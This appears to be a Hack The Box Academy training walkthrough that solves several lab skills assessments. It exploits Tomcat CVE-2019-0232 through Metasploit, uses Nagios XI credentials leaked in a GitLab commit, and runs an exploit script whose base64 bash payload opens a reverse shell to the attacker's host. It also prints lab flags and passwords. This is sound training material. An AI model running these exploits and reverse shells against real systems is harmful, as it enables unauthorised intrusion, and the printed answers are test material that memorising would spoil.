# Attacking Common Applications - Skills Assessment I

## Question 1

### "What vulnerable application is running?"

After spawning the target machine, students need to launch an `Nmap` scan against it, finding many open services and applications. The one that stands out is the `Tomcat/9.0.0.M1` application, as all `Tomcat` applications with a version prior to `9.0.17` installed on Windows [suffer from a remote code execution vulnerability due to a bug in the way the Java Runtime Environment passes command line arguments to Windows](https://github.com/advisories/GHSA-8vmx-qmch-mpqg):

Code: shell

```shell
nmap -A -Pn STMIP
```

  Attacking Common Applications - Skills Assessment I

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8r9tepdgdt]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Answer: {hidden}

# Attacking Common Applications - Skills Assessment I

## Question 2

### "What port is this application running on?"

From the output of the `Nmap` scan launched previously, students will know that the `Tomcat` application is running on port `8080`:

Code: shell

```shell
nmap -A -Pn STMIP
```

  Attacking Common Applications - Skills Assessment I

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8r9tepdgdt]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Answer: {hidden}

# Attacking Common Applications - Skills Assessment I

## Question 3

### "What version of the application is in use? "

From the output of the `Nmap` scan launched previously, students will know that the version of the `Tomcat` application is `9.0.0.M1`:

Code: shell

```shell
nmap -A -Pn STMIP
```

  Attacking Common Applications - Skills Assessment I

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8r9tepdgdt]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.89

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 03:25 GMT
Nmap scan report for 10.129.201.89
Host is up (0.047s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/9.0.0.M1
|_http-favicon: Apache Tomcat
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Answer: {hidden}

# Attacking Common Applications - Skills Assessment I

## Question 4

### "Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop."

From the previous questions, students know that the `Tomcat` application running on the target machine suffers from [CVE-2019-0232](https://github.com/advisories/GHSA-8vmx-qmch-mpqg), therefore, before utilizing `msfconsole`, they need to first fuzz the `cgi` servlet for a `.bat` file; `Gobuster` will be used:

Code: shell

```shell
gobuster dir -u http://STMIP:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
```

  Attacking Common Applications - Skills Assessment I

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.201.89:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q

/cmd.bat              (Status: 200) [Size: 0]
/Cmd.bat              (Status: 200) [Size: 0]
```

Now that students have attained the batch file name, they need to launch `msfconsole` and then use the module `exploit/windows/http/tomcat_cgi_cmdlineargs`:

Code: shell

```shell
msfconsole -q
use exploit/windows/http/tomcat_cgi_cmdlineargs
```

  Attacking Common Applications - Skills Assessment I

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Subsequently, students need to set the options of the module accordingly (`FORCEEXPLOIT` needs to be set to `true`) and run the exploit:

Code: shell

```shell
set RHOSTS STMIP
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit
```

  Attacking Common Applications - Skills Assessment I

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set RHOSTS 10.129.201.89

RHOSTS => 10.129.201.89
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set TARGETURI /cgi/cmd.bat
TARGETURI => /cgi/cmd.bat
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> set FORCEEXPLOIT true
FORCEEXPLOIT => true
[msf](Jobs:0 Agents:0) exploit(windows/http/tomcat_cgi_cmdlineargs) >> exploit

[*] Started reverse TCP handler on 10.10.14.45:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Sending stage (175686 bytes) to 10.129.201.89
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[!] Make sure to manually cleanup the exe generated by the exploit
[*] Meterpreter session 1 opened (10.10.14.45:4444 -> 10.129.201.89:49688) at 2022-11-27 08:36:44 +0000

(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) >
```

At last, students need to print out the contents of the flag file "flag.txt", which is under the directory `C:\Users\Administrator\Desktop\`:

Code: shell

```shell
cat C:/Users/Administrator/Desktop/flag.txt
```

  Attacking Common Applications - Skills Assessment I

```shell-session
(Meterpreter 1)(C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi) > cat C:/Users/Administrator/Desktop/flag.txt

f55763d31a8f63ec935abd07aee5d3d0
```

Alternatively, students can also drop into a system shell (using the `meterpreter` command `shell`) and then use `type` on the flag file.

Answer: {hidden}

# Attacking Common Applications - Skills Assessment II

## Question 1

### "What is the URL of the WordPress instance?"

After spawning the target machine, students need to add the vHost entry `STMIP inlanefrieght.local` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.201.90 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to perform vHost fuzzing, finding three vHosts, `monitoring.inlanefreight.local`, `blog.inlanefreight.local`, and `gitlab.inlanefreight.local`:

Code: shell

```shell
gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q

Found: monitoring.inlanefreight.local (Status: 302) [Size: 27]
Found: blog.inlanefreight.local (Status: 200) [Size: 50119]   
Found: gitlab.inlanefreight.local (Status: 301) [Size: 339] 
```

Students then need to add the three entries to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.201.90 monitoring.inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local" >> /etc/hosts'
```

Visiting `blog.inlanefreight.local`, students will notice that it runs `WordPress`:

![Attacking_Common_Applications_Walkthrough_Image_104.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_104.png)

Students can also view the page's source and view the meta tag named `generator`. Therefore, the URL of the `WordPress` instance is `http://blog.inlanefreight.local`.:

![Attacking_Common_Applications_Walkthrough_Image_105.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_105.png)

Answer: {hidden}

# Attacking Common Applications - Skills Assessment II

## Question 2

### "What is the name of the public GitLab project?"

From the previous question, students have added the vHost `gitlab.inlanefreight.local` entry into `/etc/hosts`, therefore, they need to visit it and click on `Register now`:

![Attacking_Common_Applications_Walkthrough_Image_106.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_106.png)

![Attacking_Common_Applications_Walkthrough_Image_107.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_107.png)

![Attacking_Common_Applications_Walkthrough_Image_108.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_108.png)

Subsequently, when viewing `Explore projects`, students will that the name of the public `GitLab` project is `Virtualhost`:

![Attacking_Common_Applications_Walkthrough_Image_109.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_109.png)

![Attacking_Common_Applications_Walkthrough_Image_110.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_110.png)

Answer: {hidden}

# Attacking Common Applications - Skills Assessment II

## Question 3

### "What is the FQDN of the third vhost?"

From the vHost fuzzing performed using `Gobuster` on `inlanefreight.local` in the first question, students will know that the Fully Qualified Domain Name of the third vHost is `monitoring.inlanefreight.local`:

Code: shell

```shell
gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-wdkarbcatm]─[~]
└──╼ [★]$ gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q

Found: monitoring.inlanefreight.local (Status: 302) [Size: 27]
Found: blog.inlanefreight.local (Status: 200) [Size: 50119]   
Found: gitlab.inlanefreight.local (Status: 301) [Size: 339] 
```

Answer: {hidden}

# Attacking Common Applications - Skills Assessment II

## Question 4

### "What application is running on this third vhost? (One word)"

Students know that the URL of the third vHost is `http://monitoring.inlanefreight.local`, therefore when visiting it, they will find that it is running `Nagios`:

![Attacking_Common_Applications_Walkthrough_Image_111.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_111.png)

Answer: {hidden}

# Attacking Common Applications - Skills Assessment II

## Question 5

### "What is the admin password to access this application?"

Using the same `GitLab` account created previously, students need to navigate to `http://gitlab.inlanefreight.local:8180/explore` and click on the `Nagios Postgresql` project:

![Attacking_Common_Applications_Walkthrough_Image_112.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_112.png)

Students will notice that latest commit message mentions updating `INSTALL` with "master password", thus, they need to click on it:

![Attacking_Common_Applications_Walkthrough_Image_113.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_113.png)

Within the commit, students will find the exposed credentials `nagiosadmin:oilaKglm7M09@CPL&^lC`:

![Attacking_Common_Applications_Walkthrough_Image_114.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_114.png)

Answer: {hidden}

# Attacking Common Applications - Skills Assessment II

## Question 6

### "Obtain reverse shell access on the target and submit the contents of the flag.txt file."

First, students need to navigate to `http://monitoring.inlanefreight.local` and sign in with the previously attained credentials `nagiosadmin:oilaKglm7M09@CPL&^lC`:

![Attacking_Common_Applications_Walkthrough_Image_115.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_115.png)

At the left-most bottom corner, students will find that the `Nagios XI` version is `5.7.5`:

![Attacking_Common_Applications_Walkthrough_Image_116.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_116.png)

Searching for `nagios 5.7` exploits using `searchsploit`, students will find the Python script `49422.py` for an authenticated RCE:

Code: shell

```shell
searchsploit nagios 5.7
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ searchsploit nagios 5.7
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting                              | php/webapps/48893.txt
Nagios XI 5.7.3 - 'Manage Users' Authenticated SQL Injection                                       | php/webapps/48894.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)                              | php/webapps/48959.py
Nagios XI 5.7.3 - 'SNMP Trap Interface' Authenticated SQL Injection                                | php/webapps/48895.txt
Nagios XI 5.7.5 - Multiple Persistent Cross-Site Scripting                                         | php/webapps/49449.txt
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                                        | php/webapps/49422.py
--------------------------------------------------------------------------------------------------- ---------------------------------
```

Students need to mirror/copy the exploit script:

Code: shell

```shell
searchsploit -m php/webapps/49422.py
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ searchsploit -m php/webapps/49422.py

  Exploit: Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49422
     Path: /usr/share/exploitdb/exploits/php/webapps/49422.py
File Type: Python script, ASCII text executable

Copied to: /home/htb-ac413848/49422.py
```

Subsequently, students need to start an `nc` listener in the same terminal tab and background it (attaining a job ):

Code: shell

```shell
nc -nvlp PWNPO &
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ nc -nvlp 9001 &

[9] 19933
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, students need to run and background the exploit to attain a reverse shell:

Code: shell

```shell
python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' STMIP STMPO &
```

  Attacking Common Applications - Skills Assessment II

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.14.45 9001 &
[10] 19971
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ [+] Extract login nsp token : ab9c5412200281843f9ac8cc585265eef66d6494e2dbfec74773e4b959318681
[+] Login ... Success!
[+] Request upload form ...
[+] Extract upload nsp token : a1937444e67009d15b2ba703ce39e82081662ad065e94586aeac3552153862f1
[+] Base64 encoded payload : ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NS85MDAxIDA+JjE= | base64 -d | bash;#
[+] Sending payload ...
[+] Check your nc ...
Ncat: Connection from 10.129.14.213.
Ncat: Connection from 10.129.14.213:48286.
bash: cannot set terminal process group (1119): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skills2:/usr/local/nagiosxi/html/admin$
```

Once the reverse shell has been attained, students need to press Enter and then use `fg` on the `nc` job ID (9 in here):

Code: shell

```shell
fg 9
```

  Attacking Common Applications - Skills Assessment II

```shell-session
www-data@skills2:/usr/local/nagiosxi/html/admin$ 

[9]+  Stopped                 nc -nvlp 9001
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ fg 9

nc -nvlp 9001 
whoami
whoami

www-data
```

At last, students need to print out the contents of the flag file "f5088a862528cbb16b4e253f1809882c_flag.txt", which is located in the same landing directory of the reverse shell:

Code: shell

```shell
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

  Attacking Common Applications - Skills Assessment II

```shell-session
www-data@skills2:/usr/local/nagiosxi/html/admin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt
<dmin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt

afe377683dce373ec2bf7eaf1e0107eb
```

Alternatively, students can use the `Metasploit` module `exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce`

Answer: {hidden}

# Attacking Common Applications - Skills Assessment III

## Question 1

### "What is the hardcoded password for the database connection in the MultimasterAPI.dll file?"

After spawning the target machine, students need to connect to the target with the credentials `administrator:xcyj8izxNVzhf4z` using RDP:

Code: shell

```shell
xfreerdp /v:STMIP /u:administrator /p:xcyj8izxNVzhf4z /dynamic-resolution
```

  Attacking Common Applications - Skills Assessment III

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac-594497@htb-llk3gi0m2q]─[~]
└──╼ [★]$ xfreerdp /v:10.129.95.200 /u:administrator /p:xcyj8izxNVzhf4z /dynamic-resolution

[17:33:32:641] [15032:15035] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[17:33:32:641] [15032:15035] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[17:33:32:641] [15032:15035] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, students need to open File Explorer and navigate to `C:\inetpub\wwwroot\bin` where they will find `MultimasterAPI.dll`:

![Attacking_Common_Applications_Walkthrough_Image_117.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_117.png)

Subsequently, students need to open another File Explorer , navigate to `C:\Tools\dnSpy` and then drag the `MultimasterAPI.dll` file onto the `dnSpy.exe`, to find the password `D3veL0pM3nT!` hardcoded in the SQL connection string:

![Attacking_Common_Applications_Walkthrough_Image_118.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_118.png)

Answer: {hidden}